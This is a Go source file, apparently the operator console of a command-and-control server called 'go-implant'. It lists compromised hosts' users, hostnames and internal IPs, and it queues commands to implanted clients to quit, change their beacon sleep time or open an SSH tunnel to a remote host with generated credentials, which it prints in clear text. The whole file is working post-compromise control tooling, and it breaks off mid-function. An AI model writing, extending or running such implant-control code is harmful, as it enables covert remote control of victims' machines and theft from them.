package view

import (
	"go-implant/common/communication"
	"go-implant/server/config"
	"go-implant/server/model"
	"fmt"
	"io"
	"log"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"text/tabwriter"
	"time"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
)

// seed random
func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

// colors
var green = color.New(color.FgGreen)
var yellow = color.New(color.FgYellow)
var cyan = color.New(color.FgCyan)
var red = color.New(color.FgRed)

func printClientInfo(UID string) {
	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)
	fmt.Printf("UID: %s\n", client.Beacon.UID)
	fmt.Printf("CurrentUser: %s\n", client.Beacon.CurrentUser)
	fmt.Printf("Hostname: %s\n", client.Beacon.Hostname)
	fmt.Printf("OS: %s\n", client.Beacon.OS)
	fmt.Printf("Internal IPs: %s\n", client.Beacon.InternalIPS)
	fmt.Printf("Commands in queue: %s\n", client.Commandqueue)
	fmt.Printf("Sleeptime: %d seconds\n", client.Beacon.Sleeptime)
	fmt.Printf("Last active: %s ago\n", time.Since(client.Lastactive).Truncate(time.Second))
	if client.Username != "" && client.Password != "" && client.Forward != nil {
		for _, listener := range client.Forward.Listeners {
			fmt.Printf("Tunnel active.\n\tAddress: %s\n\tUsername: %s\n\tPassword: %s\n\n", listener.Addr(), client.Username, client.Password)
		}
	} else {
		fmt.Printf("No tunnel active to this host\n\n")
	}
}

// kill client
func assignKill(UID string) {
	fmt.Printf("Killing client %s\n", UID)

	// verify is this correct
	cyan.Print("Are you sure? y/n ")
	var choice string
	fmt.Scanf("%s", &choice)
	if choice != "y" {
		fmt.Println("Aborted killing client")
		return
	}

	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	comm := communication.Command{Command: communication.Quit, Args: nil}
	client.Commandqueue = append(client.Commandqueue, comm)

	model.Store(UID, client) // store the modified client
	fmt.Println("Command added to queue.")

	printClientInfo(UID)
}

// remove client record
func removeClient(UID string) {
	fmt.Printf("Removing client record %s\n", UID)

	// verify is this correct
	cyan.Print("Are you sure? y/n ")
	var choice string
	fmt.Scanf("%s", &choice)
	if choice != "y" {
		fmt.Println("Aborted removing client record")
		return
	}

	// remove the client record
	model.Remove(UID)
	fmt.Printf("Client record %s removed\n\n", UID)
}

// Set new sleeptime for client
func setSleeptime(UID string) {

	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	fmt.Printf("Sleeptime now: %d seconds\n", client.Beacon.Sleeptime)

	// choose command to delete
	var sleeptime int
	fmt.Print("\n\nNew sleeptime (seconds): ")
	fmt.Scanf("%d", &sleeptime)

	if sleeptime <= 0 {
		red.Println("Invalid sleeptime")
	} else {
		// add the setSleeptime command to the clients queue
		comm := communication.Command{Command: communication.SetSleeptime, Args: []string{strconv.Itoa(sleeptime)}}
		client.Commandqueue = append(client.Commandqueue, comm)

		model.Store(UID, client) // store the modified client
		fmt.Println("Command added to queue.")
		printClientInfo(UID)
	}
}

// remove command from client's queue
func removeCommand(UID string) {
	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	fmt.Println("Commands in queue:")
	for i := 0; i < len(client.Commandqueue); i++ {
		fmt.Printf("%d: %s", i, client.Commandqueue[i])
	}

	// choose command to delete
	var commandtodelete int
	fmt.Print("\n\nCommand to delete: ")
	fmt.Scanf("%d", &commandtodelete)

	if len(client.Commandqueue) <= commandtodelete {
		// no such command
		red.Println("Invalid command")
	} else {
		// remove the command at the given index
		client.Commandqueue = append(client.Commandqueue[:commandtodelete], client.Commandqueue[commandtodelete+1:]...)

		model.Store(UID, client) // store the modified client
		fmt.Println("Command removed from queue.")
		printClientInfo(UID)
	}
}

// add command to start ssh to client with uid UID
func assignQuickSSH(UID string) {

	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	if client.Forward != nil {
		fmt.Println("This client already has active tunnel open")
		return
	}

	var localsshport = 0 // use first free port on host
	var localsshusername string
	var localsshpassword string
	var remotesshusername string
	var remotesshpassword string
	var remotesshHost string
	var remotesshPort = config.SSHport
	var fromPort = 0 // not used (first free port is used)

	if client.Username == "" && client.Password == "" {
		// generate credentials
		client.Username = randStringRunes(10)
		client.Password = randStringRunes(10)
	}

	localsshusername = client.Username
	localsshpassword = client.Password
	remotesshusername = client.Username
	remotesshpassword = client.Password

	fmt.Print("Remote SSH host: ")
	fmt.Scanf("%s", &remotesshHost)

	// verify info is correct
	cyan.Print("Is everything correct? y/n ")
	var choice string
	fmt.Scanf("%s", &choice)
	if choice != "y" {
		fmt.Println("Aborted adding command")
		return
	}

	s := []string{strconv.Itoa(